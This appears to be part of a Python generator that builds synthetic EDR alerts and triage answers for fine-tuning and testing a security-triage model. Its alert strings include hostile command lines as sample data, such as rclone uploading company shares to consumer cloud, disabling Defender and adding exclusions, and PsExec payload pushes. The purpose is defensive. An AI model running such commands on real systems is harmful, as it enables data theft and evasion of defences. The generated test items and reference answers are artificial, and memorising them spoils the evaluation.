def psexec_mal():
    u = user(); src, grp, os_ = ws_host(); t, h = ts("offhours")
    n = R.randint(5, 23)
    a = alert("Remote service creation across multiple hosts (PsExec)", "High", t, src, grp, os_, "CORP\\" + u,
              "C:\\Users\\{}\\AppData\\Local\\Temp\\ps.exe".format(u),
              "ps.exe @targets.txt -accepteula -s -d cmd /c C:\\Windows\\Temp\\{}.exe".format(rand_name(5)),
              "cmd.exe <- {}.exe".format(rand_name(6)),
              "Microsoft Corporation (Sysinternals PsExec, renamed)",
              "PSEXESVC service installed on {} hosts within 4 minutes, including 2 domain controllers".format(n))
    return a, tri("True Positive", "High", "Critical",
                  "T1569.002 - System Services: Service Execution; T1021.002 - SMB/Windows Admin Shares",
                  "A standard user's workstation pushed a payload to {} hosts with renamed PsExec off-hours, which is active lateral movement.".format(n),
                  ["A renamed PsExec ran from a user Temp folder and targeted a host list file.",
                   "{} hosts received PSEXESVC in 4 minutes, including domain controllers.".format(n),
                   "{} is a standard user on a {} host, not an administrator on a jump server.".format(u, grp),
                   offhours_note(h)],
                  ["Isolate {} and every host that received PSEXESVC.".format(src),
                   "Disable {} and any credentials used for the remote connections, and assume domain compromise because DCs are affected.".format(u),
                   "Collect the deployed payload from C:\\Windows\\Temp on a target host for analysis.",
                   "Escalate to incident response leadership immediately."])


def psexec_benign():
    adm = admin_user(); src, grp, os_ = srv_host("jmp"); t, h = ts("night_window")
    kb = "KB50{}".format(R.randint(30000, 49999))
    a = alert("Remote service creation across multiple hosts (PsExec)", "Medium", t, src, grp, os_, "CORP\\" + adm,
              "C:\\Tools\\Sysinternals\\PsExec64.exe",
              "PsExec64.exe @C:\\Patching\\wave2.txt -s msiexec /i \\\\SRV-APP01\\deploy\\{}.msi /qn".format(kb),
              "powershell.exe <- explorer.exe", "Microsoft Corporation (Sysinternals)",
              "PSEXESVC installed on {} application servers; activity falls inside the nightly maintenance window".format(R.randint(6, 18)))
    return a, tri("Benign True Positive", "Medium", "Low",
                  "T1569.002 - Service Execution (authorized administration)",
                  "An admin account on the jump server used PsExec to push a patch installer during the maintenance window, which matches normal patching.",
                  ["Source {} is an admin jump server, and {} is a privileged admin account.".format(src, adm),
                   "PsExec runs unrenamed from a managed tools path.",
                   "The payload is an MSI for {} from an internal deployment share.".format(kb),
                   "Activity occurred during the nightly maintenance window."],
                  ["Verify a change ticket exists for the {} deployment on these servers.".format(kb),
                   "Close as Benign True Positive once the ticket is confirmed, otherwise escalate."])


def psexec_ambiguous():
    adm = admin_user(); src, grp, os_ = ws_host(); t, h = ts("business")
    tgt = "SRV-APP{:02d}".format(R.randint(1, 12))
    a = alert("Remote service creation (PsExec)", "Medium", t, src, grp, os_, "CORP\\" + adm,
              "C:\\Users\\{}\\Downloads\\PsExec64.exe".format(adm),
              "PsExec64.exe \\\\{} -s cmd /c \"ipconfig /all & net localgroup administrators\"".format(tgt),
              "cmd.exe <- explorer.exe", "Microsoft Corporation (Sysinternals)",
              "Single target {}; PsExec downloaded from live.sysinternals.com 5 minutes earlier".format(tgt))
    return a, tri("Needs Investigation", "Medium", "Medium",
                  "T1569.002 - Service Execution; T1069.001 - Permission Groups Discovery: Local Groups",
                  "An admin account ran freshly downloaded PsExec from a standard workstation against one server for discovery commands; it is plausible troubleshooting but outside normal admin practice.",
                  ["{} is a privileged account, and the commands are low impact.".format(adm),
                   "It ran from {}, a {} host, instead of a jump server.".format(src, grp),
                   "PsExec was downloaded minutes earlier into Downloads rather than run from managed tooling.",
                   "Enumerating local administrators is also typical attacker discovery."],
                  ["Confirm with the owner of {} whether they ran this and why.".format(adm),
                   "Check {} sign-in history for anomalies such as new source IPs or MFA failures.".format(adm),
                   "If unconfirmed, disable the account and isolate {}.".format(src)])


def rclone_mal():
    host, grp, os_ = srv_host("file"); t, h = ts("offhours")
    exe = pick(["svchosts.exe", "rclone.exe", "taskhostw.exe"])
    remote = pick(["mega:bk", "remote:data", "pcloud:x"])
    gb = R.randint(18, 240)
    a = alert("Possible data exfiltration via cloud sync tool", "High", t, host, grp, os_, "CORP\\" + pick(["svc_sql", admin_user()]),
              "C:\\ProgramData\\{}".format(exe),
              "{} copy \\\\{}\\{} {} --transfers 16 --ignore-existing --config C:\\ProgramData\\rc.conf -q".format(exe, host, pick(["Finance", "HR", "Legal", "Shares"]), remote),
              "cmd.exe <- {}.exe".format(rand_name(6)), "Unsigned (file metadata: rclone)",
              "{} GB uploaded to {} over 2 hours; no prior use of this tool in the environment".format(gb, pick(["g.api.mega.co.nz", "api.pcloud.com"])))
    return a, tri("True Positive", "High", "Critical",
                  "T1567.002 - Exfiltration to Cloud Storage; T1036.005 - Masquerading",
                  "Rclone, run from ProgramData, uploaded {} GB from a sensitive share to consumer cloud storage off-hours; this is data exfiltration.".format(gb),
                  ["File metadata identifies {} as rclone, a common exfiltration tool.".format(exe),
                   "The destination {} is a consumer cloud service, not a corporate backup target.".format(remote),
                   "{} GB left the network in 2 hours using 16 parallel transfers.".format(gb),
                   offhours_note(h)],
                  ["Isolate {} and block the cloud storage destination at the egress firewall.".format(host),
                   "Disable the account that ran the tool and review its logons.",
                   "Use the rclone config and logs to determine exactly which files left the network.",
                   "Engage legal and privacy teams about potential breach notification."])


def rclone_benign():
    host, grp, os_ = srv_host("bkp"); t, h = ts("night_window")
    a = alert("Possible data exfiltration via cloud sync tool", "Medium", t, host, grp, os_, "CORP\\svc_backup",
              "C:\\Program Files\\rclone\\rclone.exe",
              "rclone.exe sync D:\\BackupStaging corp-s3:corp-backups-prod/{} --s3-server-side-encryption AES256 --log-file D:\\Logs\\rclone.log".format(host.lower()),
              "taskeng.exe <- svchost.exe (Task: Nightly-Offsite-Backup)", "Unsigned (file metadata: rclone)",
              "Destination is the company-owned S3 bucket corp-backups-prod; job has run nightly with similar volumes for 180 days")
    return a, tri("Benign True Positive", "High", "Low",
                  "T1567.002 - Exfiltration to Cloud Storage (authorized backup)",
                  "The backup service account ran rclone from a scheduled task to sync backups to the company's own S3 bucket, consistent with its history.",
                  ["The account is svc_backup on {}, a backup server.".format(host),
                   "The destination corp-backups-prod is company-owned and uses server-side encryption.",
                   "A named scheduled task launched it, and the job has run nightly for 180 days.",
                   "The binary is installed in Program Files rather than a temp or ProgramData path."],
                  ["Close as Benign True Positive.",
                   "Allowlist rclone for this path, account, and destination bucket, and keep alerting on any other remote."])


def rundll32_mal():
    u = user(); host, grp, os_ = ws_host(); t, h = ts("any")
    dll = "C:\\Users\\{}\\AppData\\Local\\Temp\\{}.dll".format(u, rand_name(7))
    ip = ext_ip()
    a = alert("Suspicious rundll32 execution", "High", t, host, grp, os_, "CORP\\" + u,
              "C:\\Windows\\System32\\rundll32.exe",
              "rundll32.exe {},{}".format(dll, pick(["DllRegisterServer", "Start", "#1", "Control_RunDLL"])),
              pick(["wscript.exe <- explorer.exe", "mshta.exe <- explorer.exe", "cmd.exe <- msedge.exe"]),
              "Microsoft Windows (loaded DLL unsigned)",
              "Loaded DLL is unsigned with 0 prevalence; rundll32 connected to {}:443 using a self-signed TLS certificate".format(ip))
    return a, tri("True Positive", "High", "High",
                  "T1218.011 - System Binary Proxy Execution: Rundll32; T1071.001 - Application Layer Protocol: Web Protocols",
                  "rundll32 loaded an unsigned DLL from a Temp folder and opened an outbound TLS session to a raw IP, consistent with a malware loader beaconing to C2.",
                  ["The DLL is unsigned, has zero prevalence, and runs from the user's Temp folder.",
                   "rundll32 was launched by a script host or browser chain, not by Windows itself.",
                   "rundll32 connected to {} with a self-signed certificate, which is unusual for this binary.".format(ip)],
                  ["Isolate {}.".format(host),
                   "Collect the DLL for sandbox analysis and block {}.".format(ip),
                   "Search the fleet for the DLL hash and for connections to the IP."])


def rundll32_benign():
    u = user(); host, grp, os_ = ws_host(); t, h = ts("business")
    cmd = pick(["rundll32.exe shell32.dll,Control_RunDLL desk.cpl,,0",
                "rundll32.exe printui.dll,PrintUIEntry /in /n \\\\PRT-HQ-{:02d}\\Floor{}".format(R.randint(1, 20), R.randint(1, 5)),
                "rundll32.exe shell32.dll,Control_RunDLL mmsys.cpl,,0",
                "rundll32.exe C:\\Windows\\System32\\shell32.dll,SHCreateLocalServerRunDll {9aa46009-3ce0-458a-a354-715610a075e6}"])
    a = alert("Suspicious rundll32 execution", "Low", t, host, grp, os_, "CORP\\" + u,
              "C:\\Windows\\System32\\rundll32.exe", cmd,
              pick(["explorer.exe", "control.exe <- explorer.exe", "svchost.exe -k DcomLaunch"]), "Microsoft Windows",
              "Loaded DLL is a signed Windows system DLL in System32; no network connections")
    return a, tri("False Positive", "High", "Informational",
                  "T1218.011 - Rundll32 (detection category only)",
                  "rundll32 loaded a signed Windows system DLL to open a Control Panel applet or printer dialog, which is normal Windows behavior.",
                  ["The command calls a built-in export of a signed System32 DLL.",
                   "The parent is a standard Windows shell process.",
                   "No network connections, file drops, or unsigned modules were observed."],
                  ["Close as False Positive.",
                   "Tune the rule to exclude signed System32 DLLs called through documented Control Panel and print exports."])


def discovery_mal():
    u = user(); host, grp, os_ = ws_host(); t, h = ts("any")
    p = "C:\\Users\\{}\\AppData\\Roaming\\{}.exe".format(u, rand_name(6))
    a = alert("Burst of domain reconnaissance commands", "High", t, host, grp, os_, "CORP\\" + u,
              "C:\\Windows\\System32\\net.exe", 'net group "Domain Admins" /domain',
              "cmd.exe <- {}".format(p), "Microsoft Windows",
              "Within 90 seconds the same parent ran: whoami /all; nltest /domain_trusts; nltest /dclist:corp; net view /all; net group \"Enterprise Admins\" /domain")
    return a, tri("True Positive", "High", "High",
                  "T1087.002 - Domain Account Discovery; T1069.002 - Domain Groups; T1482 - Domain Trust Discovery",
                  "An unknown binary in AppData ran a scripted burst of domain and privileged-group reconnaissance, typical of post-exploitation tooling.",
                  ["Six discovery commands ran within 90 seconds, a scripted pattern rather than manual work.",
                   "The parent {} is an unknown binary in a user-writable path.".format(p),
                   "{} is a standard {} user with no reason to enumerate domain trusts or admin groups.".format(u, grp),
                   "Querying Domain Admins and Enterprise Admins indicates target selection for privilege escalation."],
                  ["Isolate {} and acquire the parent binary.".format(host),
                   "Reset {}'s credentials and check other hosts for the same binary hash.".format(u),
                   "Monitor privileged accounts for unusual authentication over the next 72 hours."])


def discovery_benign():
    adm = admin_user(); host, grp, os_ = srv_host("help"); t, h = ts("business")
    target = user()
    a = alert("Domain account discovery", "Low", t, host, grp, os_, "CORP\\" + adm,
              "C:\\Windows\\System32\\net.exe", "net user {} /domain".format(target),
              "cmd.exe <- explorer.exe", "Microsoft Windows",
              "Single command; the helpdesk ticket system shows an open password-reset ticket for user {}".format(target))
    return a, tri("Benign True Positive", "High", "Informational",
                  "T1087.002 - Domain Account Discovery (authorized helpdesk activity)",
                  "A helpdesk admin looked up a single user account while working an open password-reset ticket.",
                  ["{} is a helpdesk admin account on an IT Helpdesk workstation.".format(adm),
                   "Only one targeted lookup ran, not a burst of enumeration.",
                   "An open ticket for {} explains the query.".format(target)],
                  ["Close as Benign True Positive.",
                   "Optionally suppress single net user lookups from IT Helpdesk hosts."])


def defender_mal():
    u = user(); host, grp, os_ = ws_host(); t, h = ts("any")
    a = alert("Attempt to disable Microsoft Defender protections", "High", t, host, grp, os_, "CORP\\" + u,
              "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
              "powershell -c \"Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath 'C:\\ProgramData','C:\\Users\\Public'\"",
              "cmd.exe <- C:\\Users\\Public\\{}.exe".format(rand_name(5)), "Microsoft Windows",
              "Tamper protection blocked the realtime change; exclusion paths were added; new file dropped in C:\\ProgramData 15 seconds later")
    return a, tri("True Positive", "High", "High",
                  "T1562.001 - Impair Defenses: Disable or Modify Tools",
                  "An unknown binary in C:\\Users\\Public tried to disable Defender realtime protection, excluded staging folders, and then dropped a file into one; this is defense evasion before payload delivery.",
                  ["The command disables realtime monitoring and excludes broad user-writable paths.",
                   "The parent is an unknown executable in C:\\Users\\Public, not Intune or SCCM.",
                   "A new file was written into an excluded folder seconds later, showing intent.",
                   "Policy changes on managed endpoints come from management agents, not users."],
                  ["Isolate {}.".format(host),
                   "Remove the added exclusions and run a full scan that includes the excluded paths.",
                   "Collect the dropped file and the parent binary for analysis.",
                   "Hunt fleet-wide for recent Defender exclusion changes not made by management tooling."])


def defender_benign():
    host, grp, os_ = ws_host(); t, h = ts("business")
    app = pick(["C:\\Program Files\\Epic\\Hyperspace", "C:\\Program Files\\SAP\\FrontEnd",
                "C:\\Program Files\\Autodesk\\Revit 2025", "C:\\Program Files\\QuickBooks"])
    a = alert("Microsoft Defender exclusion added", "Medium", t, host, grp, os_, "NT AUTHORITY\\SYSTEM",
              "C:\\Program Files (x86)\\Microsoft Intune Management Extension\\AgentExecutor.exe",
              "AgentExecutor.exe -powershell \"Add-MpPreference -ExclusionPath '{}'\"".format(app),
              "Microsoft.Management.Services.IntuneWindowsAgent.exe <- services.exe", "Microsoft Corporation",
              "Same exclusion applied to {} devices in the same hour via Intune policy".format(R.randint(40, 600)))
    return a, tri("Benign True Positive", "High", "Low",
                  "T1562.001 - Impair Defenses (authorized policy change)",
                  "The Intune management agent applied a narrow Defender exclusion for a line-of-business application across many devices; this is a centrally managed policy change.",
                  ["The Intune Management Extension, signed by Microsoft and running as SYSTEM, made the change.",
                   "The exclusion is scoped to one application folder, {}, not a broad staging path.".format(app),
                   "The same change rolled out to many devices at once, consistent with a policy deployment.",
                   "Realtime protection was not disabled."],
                  ["Close as Benign True Positive.",
                   "Confirm the exclusion is documented in the Intune policy change log.",
                   "Periodically review Intune exclusions to keep them narrow."])


def webshell_mal():
    host, grp, os_ = srv_host("web"); t, h = ts("any")
    f = "C:\\inetpub\\wwwroot\\aspnet_client\\{}.aspx".format(rand_name(6))
    cmd = pick(["cmd.exe /c whoami & ipconfig /all", "cmd.exe /c net user /domain",
                "cmd.exe /c powershell -enc " + ps_enc("Get-Process | Out-String")])
    a = alert("Web server process spawned command shell", "High", t, host, grp, os_, "IIS APPPOOL\\DefaultAppPool",
              "C:\\Windows\\System32\\cmd.exe", cmd, "w3wp.exe -ap \"DefaultAppPool\"", "Microsoft Windows",
              "New file {} created 10 minutes earlier; IIS logs show POST requests to it from {}".format(f, ext_ip()))
    return a, tri("True Positive", "High", "Critical",
                  "T1505.003 - Server Software Component: Web Shell; T1190 - Exploit Public-Facing Application",
                  "An IIS worker process on an internet-facing server is running shell commands after a new .aspx file appeared and received external POSTs, which indicates a web shell.",
                  ["w3wp.exe spawning cmd.exe for reconnaissance commands is a strong web shell indicator.",
                   "A new file {} was created shortly before the activity.".format(f),
                   "IIS logs show external POST requests to that file.",
                   "{} is internet-facing and exposed to exploitation.".format(host)],
                  ["Isolate {} or pull it from the load balancer.".format(host),
                   "Preserve and then remove the web shell, and collect IIS logs to identify source IPs and the entry vulnerability.",
                   "Patch the exploited application and hunt for credential theft or lateral movement from the server.",
                   "Check other web servers for similar new .aspx files."])


def webshell_fp():
    host, grp, os_ = srv_host(pick(["web", "app"])); t, h = ts("any")
    a = alert("Web server process spawned unusual child", "Medium", t, host, grp, os_,
              "IIS APPPOOL\\{}".format(pick(["CustomerPortal", "IntranetApp", "DefaultAppPool"])),
              "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe",
              '"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe" /noconfig /fullpaths @"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Temporary ASP.NET Files\\root\\{}\\{}.cmdline"'.format(rand_name(8), rand_name(8)),
              "w3wp.exe", "Microsoft Corporation",
              "Application pool recycled 1 minute earlier after a scheduled deployment; no new .aspx files outside the deployment package")
    return a, tri("False Positive", "High", "Informational",
                  "T1505.003 - Web Shell (detection category only)",
                  "IIS invoked the .NET C# compiler to compile ASP.NET pages after an app pool recycle, which is standard ASP.NET behavior.",
                  ["csc.exe ran from the .NET Framework folder with a Temporary ASP.NET Files response file, the normal dynamic compilation pattern.",
                   "The app pool recycled after a scheduled deployment, which triggers recompilation.",
                   "No command shells, reconnaissance commands, or unexpected new pages were observed."],
                  ["Close as False Positive.",
                   "Exclude csc.exe and cvtres.exe children of w3wp.exe when the arguments reference Temporary ASP.NET Files."])


def ransom_mal():
    host, grp, os_ = srv_host("file"); t, h = ts("offhours")
    ext = "." + rand_name(5)
    n = R.randint(2000, 40000)
    exe = rand_name(6)
    a = alert("Mass file modification consistent with ransomware", "Critical", t, host, grp, os_,
              "CORP\\" + pick(["svc_sql", admin_user(), user()]),
              "C:\\Users\\Public\\{}.exe".format(exe),
              "{}.exe -path \\\\{}\\Shares -threads 32".format(exe, host),
              "cmd.exe <- PSEXESVC.exe", "Unsigned",
              "{} files renamed to *{} in 6 minutes; README_RESTORE_FILES.txt dropped in every folder; high-entropy writes".format(n, ext))
    return a, tri("True Positive", "High", "Critical",
                  "T1486 - Data Encrypted for Impact; T1569.002 - Service Execution",
                  "An unsigned binary deployed via PsExec is encrypting file shares, renaming {} files and dropping ransom notes; this is active ransomware.".format(n),
                  ["{} files were renamed with the new extension {} in 6 minutes, with high-entropy writes.".format(n, ext),
                   "Ransom notes named README_RESTORE_FILES.txt were dropped in every folder.",
                   "The unsigned process runs from C:\\Users\\Public and was launched via PSEXESVC, showing remote deployment.",
                   offhours_note(h)],
                  ["Isolate {} immediately, and cut file share access network-wide if spread is suspected.".format(host),
                   "Disable the account that ran the binary and find the host that pushed PSEXESVC.",
                   "Preserve backups and verify offline copies before any restoration.",
                   "Activate the ransomware response playbook and notify leadership and legal."])


def ransom_benign():
    host, grp, os_ = srv_host("file"); t, h = ts("night_window")
    n = R.randint(5000, 90000)
    a = alert("Mass file modification consistent with ransomware", "High", t, host, grp, os_, "CORP\\svc_migration",
              "C:\\Windows\\System32\\Robocopy.exe",
              "robocopy \\\\SRV-FILE-OLD\\Shares \\\\{}\\Shares /MIR /COPYALL /R:1 /W:1 /MT:32 /LOG:D:\\Logs\\mig.log".format(host),
              "powershell.exe <- taskeng.exe (Task: Share-Migration-Wave3)", "Microsoft Windows",
              "{} files written; file extensions unchanged; no ransom notes; entropy consistent with source files".format(n))
    return a, tri("Benign True Positive", "High", "Low",
                  "T1486 - Data Encrypted for Impact (detection category only)",
                  "A scheduled robocopy migration by the migration service account wrote many files and tripped the volume-based rule; there are no signs of encryption.",
                  ["robocopy.exe is a signed Windows tool running a /MIR copy between file servers.",
                   "The svc_migration account ran it from a named migration scheduled task.",
                   "File extensions are unchanged, entropy matches the source, and no ransom notes were found."],
                  ["Confirm the migration wave is on the change calendar.",
                   "Close as Benign True Positive and suppress this task for the duration of the migration."])


def rat_mal():
    u = user(); host = "WS-FIN-{:03d}".format(R.randint(1, 250)); t, h = ts(pick(["business", "offhours"]))
    tool = pick([("AnyDesk.exe", "philandro Software GmbH"), ("ScreenConnect.ClientSetup.exe", "ConnectWise, LLC"),
                 ("rustdesk.exe", "Purslane Ltd")])
    dom = bad_domain()
    a = alert("Unapproved remote access tool executed", "High", t, host, "Finance Workstations", pick(OS_WS), "CORP\\" + u,
              "C:\\Users\\{}\\Downloads\\{}".format(u, tool[0]), '"C:\\Users\\{}\\Downloads\\{}"'.format(u, tool[0]),
              "explorer.exe", tool[1],
              "Downloaded from https://{} 2 minutes earlier; inbound remote session established; user reported a call from an external number claiming to be 'IT Support'".format(dom))
    return a, tri("True Positive", "High", "High",
                  "T1219 - Remote Access Software; T1566.004 - Phishing: Spearphishing Voice",
                  "A Finance user downloaded and ran {} from a lookalike domain during a call from a fake 'IT Support' caller, giving an outsider remote control.".format(tool[0]),
                  ["{} is not the company's approved remote support tool and ran from the Downloads folder.".format(tool[0]),
                   "It was downloaded from {}, not the vendor's official site.".format(dom),
                   "An inbound remote session was established immediately after.",
                   "The 'IT Support' call matches the classic help-desk impersonation pattern."],
                  ["Isolate {} and terminate the remote session.".format(host),
                   "Reset {}'s credentials and review for fraudulent payments or data access during the session.".format(u),
                   "Block {} and the tool's relay domains at the proxy.".format(dom),
                   "Warn staff about the fake IT Support calls."])


def rat_benign():
    host, grp, os_ = srv_host("help"); t, h = ts("business")
    a = alert("Remote access tool executed", "Medium", t, host, grp, os_, "NT AUTHORITY\\SYSTEM",
              "C:\\Program Files\\TeamViewer\\TeamViewer_Service.exe",
              '"C:\\Program Files\\TeamViewer\\TeamViewer_Service.exe"',
              "msiexec.exe <- CcmExec.exe", "TeamViewer Germany GmbH",
              "Installed via Software Center deployment 'TeamViewer Corporate 15'; connections only to the company's TeamViewer tenant")
    return a, tri("Benign True Positive", "High", "Low",
                  "T1219 - Remote Access Software (authorized)",
                  "SCCM installed the corporate TeamViewer build on an IT Helpdesk workstation; this is approved remote support tooling.",
                  ["SCCM installed it through Software Center as a named corporate package.",
                   "It is signed by TeamViewer Germany GmbH and installed in Program Files.",
                   "{} is an IT Helpdesk host, where remote support tools are expected.".format(host),
                   "Connections go only to the company's TeamViewer tenant."],
                  ["Close as Benign True Positive.",
                   "Allowlist the corporate TeamViewer package on IT Helpdesk hosts and keep alerting elsewhere."])


VARIANTS = [lsass_procdump, lsass_comsvcs, lsass_werfault,
            ps_encoded_office, ps_encoded_sccm, ps_encoded_ambiguous,
            certutil_download, certutil_decode, certutil_hashfile,
            office_child_mal, office_child_splwow, office_child_addin,
            schtask_mal, schtask_benign, runkey_mal, runkey_benign,
            vss_mal, vss_benign, psexec_mal, psexec_benign, psexec_ambiguous,
            rclone_mal, rclone_benign, rundll32_mal, rundll32_benign,
            discovery_mal, discovery_benign, defender_mal, defender_benign,
            webshell_mal, webshell_fp, ransom_mal, ransom_benign,
            rat_mal, rat_benign]


# ------------------------------------------------------------------- rendering
def render_alert(a):
    if R.random() < 0.5:  # key/value console style
        return "\n".join([
            "EDR ALERT",
            "Detection: {}".format(a["title"]),
            "Vendor severity: {}".format(a["vendor_sev"]),
            "Timestamp: {}".format(a["time"]),
            "Host: {} (Device group: {}, OS: {})".format(a["host"], a["group"], a["os"]),
            "User: {}".format(a["user"]),
            "Process: {}".format(a["process"]),
            "Command line: {}".format(a["cmdline"]),
            "Process tree: {}".format(a["parent"]),
            "Signer: {}".format(a["signer"]),
            "SHA256: {}".format(a["sha"]),
            "Additional context: {}".format(a["extra"])])
    return "EDR ALERT (JSON)\n" + json.dumps({
        "detection_name": a["title"], "severity": a["vendor_sev"], "timestamp": a["time"],
        "device": {"hostname": a["host"], "device_group": a["group"], "os": a["os"]},
        "user": a["user"],
        "process": {"image": a["process"], "command_line": a["cmdline"], "ancestry": a["parent"],
                    "signer": a["signer"], "sha256": a["sha"]},
        "context": a["extra"]}, indent=2)


def render_triage(t):
    lines = ["Verdict: {}".format(t["verdict"]),
             "Confidence: {}".format(t["conf"]),
             "Severity: {}".format(t["sev"]),
             "MITRE ATT&CK: {}".format(t["mitre"]),
             "Summary: {}".format(t["summary"]),
             "Key evidence:"]
    lines += ["- " + e for e in t["evidence"]]
    lines.append("Recommended actions:")
    lines += ["{}. {}".format(i + 1, x) for i, x in enumerate(t["actions"])]
    return "\n".join(lines)


def make_example(fn):
    a, t = fn()
    return {
        "conversations": [
            {"role": "system", "content": SYSTEM_PROMPT},
            {"role": "user", "content": "Triage this alert:\n\n" + render_alert(a)},
            {"role": "assistant", "content": render_triage(t)},
        ],
        "meta": {"scenario": fn.__name__, "detection": a["title"], "verdict": t["verdict"],
                 "mitre": t["mitre"].split(" - ")[0], "host": a["host"]},
    }


def main():
    global R
    os.makedirs(OUT_DIR, exist_ok=True)
    rows = [make_example(fn) for fn in VARIANTS for _ in range(SAMPLES_PER_VARIANT)]
    R.shuffle(rows)
    n_test = int(len(rows) * TEST_FRACTION)
    test, train = rows[:n_test], rows[n_test:]

    for name, data in (("train.jsonl", train), ("test.jsonl", test)):
        with open(os.path.join(OUT_DIR, name), "w", encoding="utf-8") as f:
            for r in data:
                f.write(json.dumps(r, ensure_ascii=False) + "\n")

    with open(os.path.join(OUT_DIR, "preview.csv"), "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(["split", "scenario", "detection", "host", "mitre", "verdict"])
        for split, data in (("train", train), ("test", test)):
            for r in data:
                m = r["meta"]
                w.writerow([split, m["scenario"], m["detection"], m["host"], m["mitre"], m["verdict"]])

    # Showcase alerts for the 3-tier comparison: fresh seed, never in train/test.
    R = random.Random(2026)
    show = []
    for fn in (lsass_comsvcs, ps_encoded_sccm, certutil_download):
        a, t = fn()
        show.append((fn.__name__, render_alert(a), render_triage(t)))
    with open(os.path.join(OUT_DIR, "showcase_alerts.md"), "w", encoding="utf-8") as f:
        f.write("# Showcase alerts for the base vs fine-tuned vs RAG comparison\n\n")
        f.write("Generated with a separate seed; not present in train.jsonl or test.jsonl.\n")
        f.write("Paste each prompt into every model tier. The reference answer shows a correct triage.\n\n")
        for i, (name, prompt, answer) in enumerate(show, 1):
            f.write("## Question {} ({})\n\n**Prompt**\n\n```\nTriage this alert:\n\n{}\n```\n\n".format(i, name, prompt))
            f.write("**Reference answer**\n\n```\n{}\n```\n\n".format(answer))

    counts = {}
    for r in rows:
        counts[r["meta"]["verdict"]] = counts.get(r["meta"]["verdict"], 0) + 1
    print("train={} test={} total={}".format(len(train), len(test), len(rows)))
    for k in sorted(counts):
        print("  {:<22} {}".format(k, counts[k]))


if __name__ == "__main__":
    main()
